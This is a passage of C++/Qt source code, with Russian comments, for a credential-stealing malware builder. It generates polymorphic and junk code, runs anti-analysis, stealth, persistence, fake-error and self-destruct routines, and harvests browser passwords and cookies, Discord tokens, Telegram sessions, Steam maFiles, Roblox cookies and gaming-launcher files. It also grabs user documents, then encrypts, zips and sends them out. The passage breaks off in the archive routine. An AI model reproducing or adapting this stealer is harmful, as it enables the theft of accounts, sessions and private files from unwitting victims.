        outFile << "#ifndef JUNK_CODE_GENERATED_H\n";
        outFile << "#define JUNK_CODE_GENERATED_H\n\n";
        outFile << junkCode;
        outFile << "\n#endif // JUNK_CODE_GENERATED_H\n";
        outFile.close();
        Log("Мусорный код сгенерирован и сохранён в junk_code_generated.h");
    } else {
        Log("Не удалось сгенерировать мусорный код");
    }
}

// Копирование иконки в директорию сборки
void MainWindow::copyIconToBuild() {
    if (config.iconPath.empty()) {
        Log("Путь к иконке не указан");
        return;
    }

    std::error_code ec;
    std::filesystem::create_directory("build", ec);
    if (ec) {
        Log("Не удалось создать директорию сборки: " + QString::fromStdString(ec.message()));
        return;
    }

    std::string destPath = "build\\" + std::filesystem::path(config.iconPath).filename().string();
    try {
        std::filesystem::copy_file(config.iconPath, destPath, std::filesystem::copy_options::overwrite_existing, ec);
        if (!ec) {
            Log("Иконка скопирована в: " + QString::fromStdString(destPath));
        } else {
            Log("Не удалось скопировать иконку: " + QString::fromStdString(ec.message()));
        }
    } catch (const std::exception& e) {
        Log("Исключение при копировании иконки: " + QString::fromStdString(e.what()));
    }
}

// Сборка исполняемого файла
void MainWindow::buildExecutable() {
    updateConfigFromUI();
    if (isBuilding) {
        Log("Сборка уже выполняется");
        return;
    }

    isBuilding = true;
    Log("Начало процесса сборки...");

    std::thread([this]() {
        generatePolymorphicCode();
        generateBuildKeyHeader();
        generateJunkCode();
        copyIconToBuild();

        if (!checkDependencies()) {
            Log("Проверка зависимостей не удалась, сборка прервана");
            isBuilding = false;
            return;
        }

        std::string command = "msbuild.exe project.sln /p:Configuration=Release /p:Platform=x86";
        if (!config.iconPath.empty()) {
            command += " /p:IconFile=\"" + config.iconPath + "\"";
        }
        int result = system(command.c_str());
        if (result == 0) {
            Log("Сборка завершена: " + QString::fromStdString(config.filename));
            emit startStealSignal();
        } else {
            Log("Сборка не удалась с кодом ошибки: " + QString::number(result));
        }
        isBuilding = false;
    }).detach();
}

// Проверка зависимостей
bool MainWindow::checkDependencies() {
    const char* requiredLibs[] = {
        "bcrypt.dll", "libzip.dll", "sqlite3.dll", "libcurl.dll", "libssl.dll", "libcrypto.dll", nullptr
    };

    bool allLibsPresent = true;
    for (int i = 0; requiredLibs[i]; ++i) {
        if (!GetModuleHandleA(requiredLibs[i])) {
            Log("Отсутствует зависимость: " + QString::fromStdString(requiredLibs[i]));
            allLibsPresent = false;
        }
    }

    if (!allLibsPresent) {
        Log("Одна или несколько зависимостей отсутствуют. Убедитесь, что все необходимые библиотеки установлены.");
        return false;
    }

    Log("Все зависимости присутствуют.");
    return true;
}

// Запуск GitHub Actions
void MainWindow::triggerGitHubActions() {
    if (config.githubToken.empty() || config.githubRepo.empty()) {
        Log("Токен GitHub или репозиторий не указаны");
        return;
    }

    QNetworkRequest request(QUrl("https://api.github.com/repos/" + QString::fromStdString(config.githubRepo) + "/actions/workflows/build.yml/dispatches"));
    request.setHeader(QNetworkRequest::ContentTypeHeader, "application/json");
    request.setRawHeader("Authorization", ("Bearer " + config.githubToken).c_str());
    request.setRawHeader("Accept", "application/vnd.github.v3+json");

    QJsonObject json;
    json["ref"] = "main";
    QJsonDocument doc(json);
    QByteArray data = doc.toJson();

    QNetworkReply* reply = manager->post(request, data);
    connect(reply, &QNetworkReply::finished, this, [this, reply]() {
        if (reply->error() == QNetworkReply::NoError) {
            Log("GitHub Actions успешно запущены");
            statusCheckTimer->start(30000);
        } else {
            Log("Не удалось запустить GitHub Actions: " + reply->errorString());
        }
        reply->deleteLater();
    });
}

// Проверка статуса сборки
void MainWindow::checkBuildStatus() {
    if (workflowRunId.isEmpty()) {
        Log("Нет ID запуска рабочего процесса для проверки");
        return;
    }

    QNetworkRequest request(QUrl("https://api.github.com/repos/" + QString::fromStdString(config.githubRepo) + "/actions/runs/" + workflowRunId));
    request.setRawHeader("Authorization", ("Bearer " + config.githubToken).c_str());
    request.setRawHeader("Accept", "application/vnd.github.v3+json");

    QNetworkReply* reply = manager->get(request);
    connect(reply, &QNetworkReply::finished, this, [this, reply]() {
        if (reply->error() == QNetworkReply::NoError) {
            QJsonDocument doc = QJsonDocument::fromJson(reply->readAll());
            QJsonObject obj = doc.object();
            QString status = obj["status"].toString();
            QString conclusion = obj["conclusion"].toString();
            Log("Статус сборки: " + status + ", результат: " + conclusion);
            if (status == "completed") {
                statusCheckTimer->stop();
                if (conclusion == "success") {
                    emit startStealSignal();
                }
            }
        } else {
            Log("Не удалось проверить статус сборки: " + reply->errorString());
        }
        reply->deleteLater();
    });
}

// Запуск процесса кражи данных
void MainWindow::startStealProcess() {
    if (AntiAnalysis()) {
        Log("Проверки на антианализ не пройдены, завершение работы");
        QApplication::quit();
        return;
    }

    Stealth();
    Persist();
    FakeError();

    std::string tempDir = std::filesystem::temp_directory_path().string() + "\\stolen_data_" + std::to_string(GetTickCount64());
    std::error_code ec;
    std::filesystem::create_directory(tempDir, ec);
    if (ec) {
        Log("Не удалось создать временную директорию: " + QString::fromStdString(ec.message()));
        return;
    }

    StealAndSendData(tempDir);
    SelfDestruct();
}

// Сбор и отправка данных с поддержкой Arizona RP и Radmir RP
void MainWindow::StealAndSendData(const std::string& dir) {
    std::lock_guard<std::mutex> lock(g_mutex);
    collectedData.clear();
    collectedFiles.clear();

    std::thread([this, dir]() {
        if (config.systemInfo) {
            std::string sysInfo = GetCustomSystemInfo();
            if (!sysInfo.empty()) {
                collectedData += "[Информация о системе]\n" + sysInfo + "\n";
            }
        }

        if (config.screenshot) {
            std::string screenshotPath = TakeScreenshot(dir);
            if (!screenshotPath.empty()) {
                collectedFiles.push_back(screenshotPath);
            }
        }

        if (config.cookies || config.passwords) {
            std::string browserData = stealBrowserData(dir);
            if (!browserData.empty()) {
                collectedData += "[Данные браузера]\n" + browserData + "\n";
            }
        }

        if (config.discord) {
            std::string discordTokens = StealDiscordTokens(dir);
            if (!discordTokens.empty()) {
                collectedData += "[Токены Discord]\n" + discordTokens + "\n";
            }
            std::string discordCache = StealAppCacheData("Discord", dir + "\\Discord_Cache");
            if (!discordCache.empty()) {
                collectedData += "[Кэш Discord]\n" + discordCache + "\n";
            }
        }

        if (config.telegram) {
            std::string telegramData = StealTelegramData(dir);
            if (!telegramData.empty()) {
                collectedData += "[Данные Telegram]\n" + telegramData + "\n";
            }
        }

        if (config.steam || config.steamMAFile) {
            std::string steamData = StealSteamData(dir);
            if (!steamData.empty()) {
                collectedData += "[Данные Steam]\n" + steamData + "\n";
            }
        }

        if (config.epic) {
            std::string epicData = StealEpicGamesData(dir);
            if (!epicData.empty()) {
                collectedData += "[Данные Epic Games]\n" + epicData + "\n";
            }
        }

        if (config.roblox) {
            std::string robloxData = StealRobloxData(dir);
            if (!robloxData.empty()) {
                collectedData += "[Данные Roblox]\n" + robloxData + "\n";
            }
        }

        if (config.battlenet) {
            std::string battlenetData = StealBattleNetData(dir);
            if (!battlenetData.empty()) {
                collectedData += "[Данные Battle.net]\n" + battlenetData + "\n";
            }
        }

        if (config.minecraft) {
            std::string minecraftData = StealMinecraftData(dir);
            if (!minecraftData.empty()) {
                collectedData += "[Данные Minecraft]\n" + minecraftData + "\n";
            }
        }

        // Добавлена поддержка Arizona RP
        if (config.arizonaRP) {
            std::string arizonaData = StealArizonaRPData(dir);
            if (!arizonaData.empty()) {
                collectedData += "[Данные Arizona RP]\n" + arizonaData + "\n";
            }
        }

        // Добавлена поддержка Radmir RP
        if (config.radmirRP) {
            std::string radmirData = StealRadmirRPData(dir);
            if (!radmirData.empty()) {
                collectedData += "[Данные Radmir RP]\n" + radmirData + "\n";
            }
        }

        if (config.discord || config.telegram) {
            std::vector<std::string> processes = {"Discord.exe", "Telegram.exe"};
            for (const auto& process : processes) {
                std::string wsData = CaptureWebSocketSessions(process);
                if (!wsData.empty()) {
                    collectedData += "[Сессии WebSocket - " + process + "]\n" + wsData + "\n";
                }
                std::string webrtcData = CaptureWebRTCSessions(process);
                if (!webrtcData.empty()) {
                    collectedData += "[Сессии WebRTC - " + process + "]\n" + webrtcData + "\n";
                }
            }
        }

        if (config.fileGrabber) {
            std::vector<std::string> grabbedFiles = GrabFiles(dir);
            collectedFiles.insert(collectedFiles.end(), grabbedFiles.begin(), grabbedFiles.end());
        }

        std::string encryptedData;
        if (!collectedData.empty()) {
            try {
                encryptedData = EncryptData(collectedData, encryptionKey1, encryptionKey2, encryptionSalt);
                Log("Данные успешно зашифрованы");
            } catch (const std::exception& e) {
                Log("Не удалось зашифровать данные: " + QString::fromStdString(e.what()));
                return;
            }
        }

        if (!collectedFiles.empty()) {
            std::string zipPath = CreateZipArchive(dir, collectedFiles);
            if (!zipPath.empty()) {
                collectedFiles.clear();
                collectedFiles.push_back(zipPath);
            }
        }

        sendData(QString::fromStdString(encryptedData), collectedFiles);
    }).detach();
}

// Кража данных Arizona RP (пример реализации)
std::string MainWindow::StealArizonaRPData(const std::string& dir) {
    if (!config.arizonaRP) return "";
    std::string result;

    char* appDataPath = nullptr;
    size_t len;
    if (_dupenv_s(&appDataPath, &len, "APPDATA") != 0 || !appDataPath) {
        Log("Не удалось получить путь APPDATA для Arizona RP");
        return result;
    }
    std::string appData(appDataPath);
    free(appDataPath);

    std::string arizonaPath = appData + "\\Arizona Games\\";
    if (!std::filesystem::exists(arizonaPath)) {
        Log("Путь Arizona RP не найден: " + QString::fromStdString(arizonaPath));
        return result;
    }

    std::error_code ec;
    try {
        for (const auto& entry : std::filesystem::recursive_directory_iterator(arizonaPath, ec)) {
            if (ec) continue;
            if (entry.path().filename().string().find("settings") != std::string::npos || entry.path().extension() == ".cfg") {
                std::ifstream file(entry.path(), std::ios::binary);
                if (!file.is_open()) {
                    Log("Не удалось открыть файл Arizona RP: " + QString::fromStdString(entry.path().string()));
                    continue;
                }
                std::string content((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
                file.close();
                result += "Arizona RP File (" + entry.path().filename().string() + "):\n" + content + "\n";

                std::string destPath = dir + "\\ArizonaRP_" + entry.path().filename().string();
                std::filesystem::copy_file(entry.path(), destPath, std::filesystem::copy_options::overwrite_existing, ec);
                if (!ec) {
                    collectedFiles.push_back(destPath);
                    Log("Файл Arizona RP скопирован: " + QString::fromStdString(destPath));
                } else {
                    Log("Не удалось скопировать файл Arizona RP: " + QString::fromStdString(ec.message()));
                }
            }
        }
    } catch (const std::exception& e) {
        Log("Исключение в StealArizonaRPData: " + QString::fromStdString(e.what()));
    }
    return result;
}

// Кража данных Radmir RP (пример реализации)
std::string MainWindow::StealRadmirRPData(const std::string& dir) {
    if (!config.radmirRP) return "";
    std::string result;

    char* appDataPath = nullptr;
    size_t len;
    if (_dupenv_s(&appDataPath, &len, "APPDATA") != 0 || !appDataPath) {
        Log("Не удалось получить путь APPDATA для Radmir RP");
        return result;
    }
    std::string appData(appDataPath);
    free(appDataPath);

    std::string radmirPath = appData + "\\Radmir RP\\";
    if (!std::filesystem::exists(radmirPath)) {
        Log("Путь Radmir RP не найден: " + QString::fromStdString(radmirPath));
        return result;
    }

    std::error_code ec;
    try {
        for (const auto& entry : std::filesystem::recursive_directory_iterator(radmirPath, ec)) {
            if (ec) continue;
            if (entry.path().filename().string().find("config") != std::string::npos || entry.path().extension() == ".ini") {
                std::ifstream file(entry.path(), std::ios::binary);
                if (!file.is_open()) {
                    Log("Не удалось открыть файл Radmir RP: " + QString::fromStdString(entry.path().string()));
                    continue;
                }
                std::string content((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
                file.close();
                result += "Radmir RP File (" + entry.path().filename().string() + "):\n" + content + "\n";

                std::string destPath = dir + "\\RadmirRP_" + entry.path().filename().string();
                std::filesystem::copy_file(entry.path(), destPath, std::filesystem::copy_options::overwrite_existing, ec);
                if (!ec) {
                    collectedFiles.push_back(destPath);
                    Log("Файл Radmir RP скопирован: " + QString::fromStdString(destPath));
                } else {
                    Log("Не удалось скопировать файл Radmir RP: " + QString::fromStdString(ec.message()));
                }
            }
        }
    } catch (const std::exception& e) {
        Log("Исключение в StealRadmirRPData: " + QString::fromStdString(e.what()));
    }
    return result;
}

// Кража данных браузеров
std::string MainWindow::stealBrowserData(const std::string& dir) {
    std::string result;
    if (!config.cookies && !config.passwords) return result;

    char* appDataPath = nullptr;
    char* localAppDataPath = nullptr;
    size_t len;

    if (_dupenv_s(&appDataPath, &len, "APPDATA") != 0 || !appDataPath) {
        Log("Не удалось получить путь APPDATA");
        return result;
    }
    std::string appData(appDataPath);
    free(appDataPath);

    if (_dupenv_s(&localAppDataPath, &len, "LOCALAPPDATA") != 0 || !localAppDataPath) {
        Log("Не удалось получить путь LOCALAPPDATA");
        free(localAppDataPath);
        return result;
    }
    std::string localAppData(localAppDataPath);
    free(localAppDataPath);

    std::vector<std::pair<std::string, std::string>> browserPaths = {
        {"Chrome", localAppData + "\\Google\\Chrome\\User Data\\Default\\"},
        {"Edge", localAppData + "\\Microsoft\\Edge\\User Data\\Default\\"},
        {"Opera", appData + "\\Opera Software\\Opera Stable\\"},
        {"OperaGX", appData + "\\Opera Software\\Opera GX Stable\\"},
        {"Yandex", localAppData + "\\Yandex\\YandexBrowser\\User Data\\Default\\"}
    };

    for (const auto& browser : browserPaths) {
        std::string browserData = StealChromiumData(browser.first, browser.second, dir);
        if (!browserData.empty()) {
            result += browserData + "\n";
        }
        std::string cachePath = browser.second + "Cache\\";
        std::string unsavedData = StealUnsavedBrowserData(browser.first, cachePath);
        if (!unsavedData.empty()) {
            result += unsavedData + "\n";
        }
    }
    return result;
}

// Кража токенов Discord
std::string MainWindow::StealDiscordTokens(const std::string& dir) {
    if (!config.discord) return "";
    std::string result;

    char* localAppDataPath = nullptr;
    char* appDataPath = nullptr;
    size_t len;

    if (_dupenv_s(&localAppDataPath, &len, "LOCALAPPDATA") != 0 || !localAppDataPath) {
        Log("Не удалось получить путь LOCALAPPDATA для токенов Discord");
        return result;
    }
    std::string localAppData(localAppDataPath);
    free(localAppDataPath);

    if (_dupenv_s(&appDataPath, &len, "APPDATA") != 0 || !appDataPath) {
        Log("Не удалось получить путь APPDATA для токенов Discord");
        free(appDataPath);
        return result;
    }
    std::string appData(appDataPath);
    free(appDataPath);

    std::vector<std::string> discordPaths = {
        appData + "\\Discord\\Local Storage\\leveldb\\",
        appData + "\\discordcanary\\Local Storage\\leveldb\\",
        appData + "\\discordptb\\Local Storage\\leveldb\\"
    };

    for (const auto& path : discordPaths) {
        if (!std::filesystem::exists(path)) continue;

        try {
            for (const auto& entry : std::filesystem::directory_iterator(path)) {
                if (entry.path().extension() == ".ldb" || entry.path().extension() == ".log") {
                    std::ifstream file(entry.path(), std::ios::binary);
                    if (!file.is_open()) {
                        Log("Не удалось открыть файл Discord: " + QString::fromStdString(entry.path().string()));
                        continue;
                    }
                    std::string content((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
                    file.close();

                    std::regex tokenRegex("[a-zA-Z0-9]{24}\\.[a-zA-Z0-9]{6}\\.[a-zA-Z0-9_-]{27}");
                    std::smatch match;
                    std::string::const_iterator searchStart(content.cbegin());
                    while (std::regex_search(searchStart, content.cend(), match, tokenRegex)) {
                        result += "Токен Discord: " + match[0].str() + "\n";
                        searchStart = match.suffix().first;
                    }
                }
            }
        } catch (const std::exception& e) {
            Log("Ошибка в StealDiscordTokens: " + QString::fromStdString(e.what()));
        }
    }

    if (!result.empty()) {
        std::string outputFile = dir + "\\discord_tokens.txt";
        std::ofstream outFile(outputFile, std::ios::binary);
        if (outFile.is_open()) {
            outFile << result;
            outFile.close();
            Log("Токены Discord сохранены в: " + QString::fromStdString(outputFile));
        } else {
            Log("Не удалось сохранить токены Discord в: " + QString::fromStdString(outputFile));
        }
    }
    return result;
}

// Кража данных Telegram
std::string MainWindow::StealTelegramData(const std::string& dir) {
    if (!config.telegram) return "";
    std::string result;

    char* appDataPath = nullptr;
    size_t len;
    if (_dupenv_s(&appDataPath, &len, "APPDATA") != 0 || !appDataPath) {
        Log("Не удалось получить путь APPDATA для данных Telegram");
        return result;
    }
    std::string appData(appDataPath);
    free(appDataPath);

    std::string telegramPath = appData + "\\Telegram Desktop\\tdata\\";
    if (!std::filesystem::exists(telegramPath)) {
        Log("Путь Telegram не найден: " + QString::fromStdString(telegramPath));
        return result;
    }

    try {
        std::error_code ec;
        for (const auto& entry : std::filesystem::directory_iterator(telegramPath, ec)) {
            if (ec) {
                Log("Ошибка доступа к директории Telegram: " + QString::fromStdString(ec.message()));
                break;
            }
            if (entry.path().filename().string().find("key_data") != std::string::npos) {
                std::ifstream file(entry.path(), std::ios::binary);
                if (!file.is_open()) {
                    Log("Не удалось открыть файл key_data Telegram: " + QString::fromStdString(entry.path().string()));
                    continue;
                }
                std::string content((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
                file.close();
                result += "Ключевые данные Telegram: [Бинарные данные, " + std::to_string(content.size()) + " байт]\n";
            }
        }

        std::string telegramDest = dir + "\\Telegram_Data";
        std::filesystem::create_directory(telegramDest, ec);
        if (!ec) {
            std::filesystem::copy(telegramPath, telegramDest, std::filesystem::copy_options::recursive | std::filesystem::copy_options::overwrite_existing, ec);
            if (!ec) {
                result += "Данные Telegram скопированы в: " + telegramDest + "\n";
                Log("Данные Telegram скопированы в: " + QString::fromStdString(telegramDest));
            } else {
                Log("Не удалось скопировать данные Telegram: " + QString::fromStdString(ec.message()));
            }
        } else {
            Log("Не удалось создать директорию для данных Telegram: " + QString::fromStdString(ec.message()));
        }
    } catch (const std::exception& e) {
        Log("Исключение в StealTelegramData: " + QString::fromStdString(e.what()));
    }
    return result;
}

// Кража данных Steam
std::string MainWindow::StealSteamData(const std::string& dir) {
    if (!config.steam && !config.steamMAFile) return "";
    std::string result;

    HKEY hKey;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Valve\\Steam", 0, KEY_READ, &hKey) != ERROR_SUCCESS) {
        Log("Не удалось открыть ключ реестра Steam: " + QString::number(GetLastError()));
        return result;
    }

    char steamPath[MAX_PATH] = {0};
    DWORD pathSize = sizeof(steamPath);
    if (RegQueryValueExA(hKey, "InstallPath", nullptr, nullptr, (LPBYTE)steamPath, &pathSize) != ERROR_SUCCESS) {
        RegCloseKey(hKey);
        Log("Не удалось получить путь установки Steam из реестра: " + QString::number(GetLastError()));
        return result;
    }
    RegCloseKey(hKey);

    std::string steamDir = steamPath;
    if (!std::filesystem::exists(steamDir)) {
        Log("Директория Steam не найдена: " + QString::fromStdString(steamDir));
        return result;
    }

    std::error_code ec;
    if (config.steam) {
        std::vector<std::string> steamFiles = {"config\\loginusers.vdf", "config\\config.vdf"};
        for (const auto& file : steamFiles) {
            std::string filePath = steamDir + "\\" + file;
            if (std::filesystem::exists(filePath)) {
                std::ifstream inFile(filePath, std::ios::binary);
                if (inFile.is_open()) {
                    std::string content((std::istreambuf_iterator<char>(inFile)), std::istreambuf_iterator<char>());
                    inFile.close();
                    result += "Файл Steam (" + file + "):\n" + content + "\n";

                    std::string destPath = dir + "\\Steam_" + std::filesystem::path(file).filename().string();
                    std::filesystem::copy_file(filePath, destPath, std::filesystem::copy_options::overwrite_existing, ec);
                    if (!ec) {
                        collectedFiles.push_back(destPath);
                        Log("Файл Steam скопирован: " + QString::fromStdString(destPath));
                    } else {
                        Log("Не удалось скопировать файл Steam: " + QString::fromStdString(ec.message()));
                    }
                } else {
                    Log("Не удалось открыть файл Steam: " + QString::fromStdString(filePath));
                }
            }
        }
    }

    if (config.steamMAFile) {
        std::string ssfnPath = steamDir + "\\";
        for (const auto& entry : std::filesystem::directory_iterator(ssfnPath, ec)) {
            if (ec) continue;
            if (entry.path().filename().string().find("ssfn") != std::string::npos) {
                std::string filePath = entry.path().string();
                std::string destPath = dir + "\\" + entry.path().filename().string();
                std::filesystem::copy_file(filePath, destPath, std::filesystem::copy_options::overwrite_existing, ec);
                if (!ec) {
                    collectedFiles.push_back(destPath);
                    result += "Файл SSFN Steam: " + entry.path().filename().string() + "\n";
                    Log("Файл SSFN Steam скопирован: " + QString::fromStdString(destPath));
                } else {
                    Log("Не удалось скопировать файл SSFN: " + QString::fromStdString(ec.message()));
                }
            }
        }

        std::string maFilesPath = steamDir + "\\config\\maFiles\\";
        if (std::filesystem::exists(maFilesPath)) {
            for (const auto& entry : std::filesystem::directory_iterator(maFilesPath, ec)) {
                if (ec) continue;
                if (entry.path().extension() == ".maFile") {
                    std::string filePath = entry.path().string();
                    std::string destPath = dir + "\\Steam_" + entry.path().filename().string();
                    std::filesystem::copy_file(filePath, destPath, std::filesystem::copy_options::overwrite_existing, ec);
                    if (!ec) {
                        collectedFiles.push_back(destPath);
                        result += "Файл MA Steam: " + entry.path().filename().string() + "\n";
                        Log("Файл MA Steam скопирован: " + QString::fromStdString(destPath));
                    } else {
                        Log("Не удалось скопировать файл MA: " + QString::fromStdString(ec.message()));
                    }
                }
            }
        }
    }
    return result;
}

// Кража данных Epic Games
std::string MainWindow::StealEpicGamesData(const std::string& dir) {
    if (!config.epic) return "";
    std::string result;

    char* localAppDataPath = nullptr;
    size_t len;
    if (_dupenv_s(&localAppDataPath, &len, "LOCALAPPDATA") != 0 || !localAppDataPath) {
        Log("Не удалось получить путь LOCALAPPDATA для данных Epic Games");
        return result;
    }
    std::string localAppData(localAppDataPath);
    free(localAppDataPath);

    std::string epicPath = localAppData + "\\EpicGamesLauncher\\Saved\\";
    if (!std::filesystem::exists(epicPath)) {
        Log("Путь Epic Games не найден: " + QString::fromStdString(epicPath));
        return result;
    }

    std::error_code ec;
    try {
        for (const auto& entry : std::filesystem::recursive_directory_iterator(epicPath, ec)) {
            if (ec) continue;
            if (entry.path().filename().string().find("Config") != std::string::npos || entry.path().extension() == ".ini") {
                std::ifstream file(entry.path(), std::ios::binary);
                if (!file.is_open()) {
                    Log("Не удалось открыть файл Epic Games: " + QString::fromStdString(entry.path().string()));
                    continue;
                }
                std::string content((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
                file.close();
                result += "Файл Epic Games (" + entry.path().filename().string() + "):\n" + content + "\n";

                std::string destPath = dir + "\\EpicGames_" + entry.path().filename().string();
                std::filesystem::copy_file(entry.path(), destPath, std::filesystem::copy_options::overwrite_existing, ec);
                if (!ec) {
                    collectedFiles.push_back(destPath);
                    Log("Файл Epic Games скопирован: " + QString::fromStdString(destPath));
                } else {
                    Log("Не удалось скопировать файл Epic Games: " + QString::fromStdString(ec.message()));
                }
            }
        }
    } catch (const std::exception& e) {
        Log("Исключение в StealEpicGamesData: " + QString::fromStdString(e.what()));
    }
    return result;
}

// Кража данных Roblox
std::string MainWindow::StealRobloxData(const std::string& dir) {
    if (!config.roblox) return "";
    std::string result;

    char* localAppDataPath = nullptr;
    size_t len;
    if (_dupenv_s(&localAppDataPath, &len, "LOCALAPPDATA") != 0 || !localAppDataPath) {
        Log("Не удалось получить путь LOCALAPPDATA для данных Roblox");
        return result;
    }
    std::string localAppData(localAppDataPath);
    free(localAppDataPath);

    std::string robloxPath = localAppData + "\\Roblox\\";
    if (!std::filesystem::exists(robloxPath)) {
        Log("Путь Roblox не найден: " + QString::fromStdString(robloxPath));
        return result;
    }

    std::error_code ec;
    try {
        for (const auto& entry : std::filesystem::recursive_directory_iterator(robloxPath, ec)) {
            if (ec) continue;
            if (entry.path().filename().string().find("GlobalBasicSettings") != std::string::npos || entry.path().extension() == ".ini") {
                std::ifstream file(entry.path(), std::ios::binary);
                if (!file.is_open()) {
                    Log("Не удалось открыть файл Roblox: " + QString::fromStdString(entry.path().string()));
                    continue;
                }
                std::string content((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
                file.close();
                result += "Файл Roblox (" + entry.path().filename().string() + "):\n" + content + "\n";

                std::string destPath = dir + "\\Roblox_" + entry.path().filename().string();
                std::filesystem::copy_file(entry.path(), destPath, std::filesystem::copy_options::overwrite_existing, ec);
                if (!ec) {
                    collectedFiles.push_back(destPath);
                    Log("Файл Roblox скопирован: " + QString::fromStdString(destPath));
                } else {
                    Log("Не удалось скопировать файл Roblox: " + QString::fromStdString(ec.message()));
                }
            }
        }

        std::string cookiePath = localAppData + "\\Roblox\\LocalStorage\\";
        if (std::filesystem::exists(cookiePath)) {
            for (const auto& entry : std::filesystem::directory_iterator(cookiePath, ec)) {
                if (ec) continue;
                if (entry.path().extension() == ".roblox.com") {
                    std::ifstream file(entry.path(), std::ios::binary);
                    if (file.is_open()) {
                        std::string content((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
                        file.close();
                        std::regex cookieRegex("ROBLOSECURITY=[^;]+");
                        std::smatch match;
                        if (std::regex_search(content, match, cookieRegex)) {
                            result += "Куки Roblox: " + match[0].str() + "\n";
                        }
                    }
                }
            }
        }
    } catch (const std::exception& e) {
        Log("Исключение в StealRobloxData: " + QString::fromStdString(e.what()));
    }
    return result;
}

// Кража данных Battle.net
std::string MainWindow::StealBattleNetData(const std::string& dir) {
    if (!config.battlenet) return "";
    std::string result;

    char* appDataPath = nullptr;
    size_t len;
    if (_dupenv_s(&appDataPath, &len, "APPDATA") != 0 || !appDataPath) {
        Log("Не удалось получить путь APPDATA для данных Battle.net");
        return result;
    }
    std::string appData(appDataPath);
    free(appDataPath);

    std::string battlenetPath = appData + "\\Battle.net\\";
    if (!std::filesystem::exists(battlenetPath)) {
        Log("Путь Battle.net не найден: " + QString::fromStdString(battlenetPath));
        return result;
    }

    std::error_code ec;
    try {
        for (const auto& entry : std::filesystem::recursive_directory_iterator(battlenetPath, ec)) {
            if (ec) continue;
            if (entry.path().extension() == ".config" || entry.path().filename().string().find("Battle.net") != std::string::npos) {
                std::ifstream file(entry.path(), std::ios::binary);
                if (!file.is_open()) {
                    Log("Не удалось открыть файл Battle.net: " + QString::fromStdString(entry.path().string()));
                    continue;
                }
                std::string content((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
                file.close();
                result += "Файл Battle.net (" + entry.path().filename().string() + "):\n" + content + "\n";

                std::string destPath = dir + "\\BattleNet_" + entry.path().filename().string();
                std::filesystem::copy_file(entry.path(), destPath, std::filesystem::copy_options::overwrite_existing, ec);
                if (!ec) {
                    collectedFiles.push_back(destPath);
                    Log("Файл Battle.net скопирован: " + QString::fromStdString(destPath));
                } else {
                    Log("Не удалось скопировать файл Battle.net: " + QString::fromStdString(ec.message()));
                }
            }
        }
    } catch (const std::exception& e) {
        Log("Исключение в StealBattleNetData: " + QString::fromStdString(e.what()));
    }
    return result;
}

// Кража данных Minecraft
std::string MainWindow::StealMinecraftData(const std::string& dir) {
    if (!config.minecraft) return "";
    std::string result;

    char* appDataPath = nullptr;
    size_t len;
    if (_dupenv_s(&appDataPath, &len, "APPDATA") != 0 || !appDataPath) {
        Log("Не удалось получить путь APPDATA для данных Minecraft");
        return result;
    }
    std::string appData(appDataPath);
    free(appDataPath);

    std::string minecraftPath = appData + "\\.minecraft\\";
    if (!std::filesystem::exists(minecraftPath)) {
        Log("Путь Minecraft не найден: " + QString::fromStdString(minecraftPath));
        return result;
    }

    std::error_code ec;
    try {
        std::vector<std::string> mcFiles = {"launcher_profiles.json", "usercache.json"};
        for (const auto& file : mcFiles) {
            std::string filePath = minecraftPath + file;
            if (std::filesystem::exists(filePath)) {
                std::ifstream inFile(filePath, std::ios::binary);
                if (inFile.is_open()) {
                    std::string content((std::istreambuf_iterator<char>(inFile)), std::istreambuf_iterator<char>());
                    inFile.close();
                    result += "Файл Minecraft (" + file + "):\n" + content + "\n";

                    std::string destPath = dir + "\\Minecraft_" + file;
                    std::filesystem::copy_file(filePath, destPath, std::filesystem::copy_options::overwrite_existing, ec);
                    if (!ec) {
                        collectedFiles.push_back(destPath);
                        Log("Файл Minecraft скопирован: " + QString::fromStdString(destPath));
                    } else {
                        Log("Не удалось скопировать файл Minecraft: " + QString::fromStdString(ec.message()));
                    }
                } else {
                    Log("Не удалось открыть файл Minecraft: " + QString::fromStdString(filePath));
                }
            }
        }
    } catch (const std::exception& e) {
        Log("Исключение в StealMinecraftData: " + QString::fromStdString(e.what()));
    }
    return result;
}

// Сбор файлов
std::vector<std::string> MainWindow::GrabFiles(const std::string& dir) {
    std::vector<std::string> grabbedFiles;
    if (!config.fileGrabber) return grabbedFiles;

    std::vector<std::string> directories = {
        std::string(getenv("USERPROFILE") ? getenv("USERPROFILE") : "") + "\\Desktop\\",
        std::string(getenv("USERPROFILE") ? getenv("USERPROFILE") : "") + "\\Documents\\",
        std::string(getenv("USERPROFILE") ? getenv("USERPROFILE") : "") + "\\Downloads\\"
    };

    std::vector<std::string> extensions = {".txt", ".doc", ".docx", ".pdf", ".jpg", ".png"};
    std::error_code ec;

    for (const auto& directory : directories) {
        if (!std::filesystem::exists(directory)) {
            Log("Директория не найдена для сбора файлов: " + QString::fromStdString(directory));
            continue;
        }

        try {
            for (const auto& entry : std::filesystem::recursive_directory_iterator(directory, ec)) {
                if (ec) continue;
                if (entry.is_regular_file()) {
                    auto ext = entry.path().extension().string();
                    if (std::find(extensions.begin(), extensions.end(), ext) != extensions.end() && entry.file_size() < 5 * 1024 * 1024) {
                        std::string destPath = dir + "\\Grabbed_" + entry.path().filename().string();
                        std::filesystem::copy_file(entry.path(), destPath, std::filesystem::copy_options::overwrite_existing, ec);
                        if (!ec) {
                            grabbedFiles.push_back(destPath);
                            Log("Файл собран: " + QString::fromStdString(destPath));
                        } else {
                            Log("Не удалось собрать файл: " + QString::fromStdString(ec.message()));
                        }
                    }
                }
            }
        } catch (const std::exception& e) {
            Log("Исключение в GrabFiles: " + QString::fromStdString(e.what()));
        }
    }
    return grabbedFiles;
}

// Создание ZIP-архива
std::string CreateZipArchive(const std::string& dir, const std::vector<std::string>& files) {
    std::string zipPath = dir + "\\data_" + std::to_string(GetTickCount64()) + ".zip";
    int err = 0;
